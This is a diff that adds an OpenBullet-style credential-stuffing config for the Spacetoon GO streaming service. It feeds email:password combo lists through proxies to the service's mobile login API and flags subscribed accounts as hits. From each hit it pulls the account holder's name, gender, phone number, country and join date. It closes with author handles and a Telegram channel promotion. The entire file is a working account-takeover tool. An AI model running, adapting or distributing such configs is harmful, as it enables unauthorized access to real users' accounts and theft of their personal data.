@@ -1,0 +1,112 @@
+[SETTINGS]
+{
+  "Name": "Spacetoon GO",
+  "SuggestedBots": 64,
+  "MaxCPM": 0,
+  "LastModified": "2022-01-15T19:16:29.9316602+01:00",
+  "AdditionalInfo": "t.me/ONEBINSFAMILY",
+  "RequiredPlugins": [],
+  "Author": "@Y0unes69",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Spacetoon GO",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#Email_Encode FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+#Pass_Encode FUNCTION Hash MD5 "<PASS>" -> VAR "PS" 
+
+#Login_Post REQUEST POST "https://spacetoongo.com/API/Mob/v4/Auth/normal_login" 
+  CONTENT "adjustSource=No%20User%20Consent&city=&device=iPhone%20-%20iPhone%207%20-%2015.0&email=<US>&extra=&fcm_token=fN6gseAnHkEooGEcfDgu69%3AAPA91bHFm71xF5lP6-7LMEkxYJXebVnU6Ew-HEUWuHa0aE2Ji6t2eu0ZEq8IGQWziEgwdLlxbFnduW_cpth__93qgMzq-ItSif6oR8A0jDuwlmPHmhTcdXA9KRH80s0YGfHfyhA2UeWT&is_kid=0&is_sub=0&md5_password=<PS>&sandbox=0&session_key=&sid=&udid=&uuid=&version_code=3&version_name=2.10.1&version_number_ios=2101" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: spacetoongo.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: /" 
+  HEADER "User-Agent: iOS" 
+  HEADER "Accept-Language: en-MA;q=1.0, fr-MA;q=0.9, ar-MA;q=0.8, en-US;q=0.7" 
+  HEADER "Content-Length: 455" 
+  HEADER "Accept-Encoding: gzip;q=1.0, compress;q=0.5" 
+
+#Login_Check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\\u062e\\u0637\\u0623 \\u0641\\u064a \\u0627\\u0633\\u0645 \\u0627\\u0644\\u0645\\u0633\\u062a\\u062e\\u062f\\u0645 \\u0623\\u0648 \\u0643\\u0644\\u0645\\u0629 \\u0627\\u0644\\u0645\\u0631\\u0648\\u0631" 
+    KEY "<SOURCE>" DoesNotContain "email" 
+  KEYCHAIN Success AND 
+    KEY "is_subscriber\":true" 
+    KEY "email" 
+  KEYCHAIN Custom "CUSTOM" AND 
+    KEY "is_subscriber\":false" 
+    KEY "email" 
+
+#Genderr PARSE "<SOURCE>" LR "\"gender\":\"" "\"," CreateEmpty=FALSE -> VAR "Genderr" 
+
+#Full_Name PARSE "<SOURCE>" LR "\"name\":\"" "\"," CreateEmpty=FALSE -> CAP "Full Name" 
+
+#Gender FUNCTION Translate 
+  KEY "M" VALUE "Male🙎‍" 
+  KEY "F" VALUE "Female🙎‍" 
+  "<Genderr>" -> CAP "Gender" 
+
+#Phone_Number PARSE "<SOURCE>" LR "\"mobile\":\"" "\"," CreateEmpty=FALSE -> CAP "Phone Number" 
+
+#Joined_At PARSE "<SOURCE>" LR "\"join_date\":\"" " " CreateEmpty=FALSE -> CAP "Joined At" 
+
+#Country PARSE "<SOURCE>" LR "\"country\":\"" "\"," CreateEmpty=FALSE -> CAP "Country" 
+
+#izSubscriber PARSE "<SOURCE>" LR "{\"is_subscriber\":" ",\"" CreateEmpty=FALSE -> CAP "izSubscriber" 
+
+#🔥_Join_US_🔥 FUNCTION Constant "@itsmeslowdeath x @Y0unes69 x @narcosse" -> CAP "🔥 Join US 🔥" 
+
+#🔥_At_🔥 FUNCTION Constant "t.me/ONEBINSFAMILY" -> CAP "🔥 At 🔥" 
+
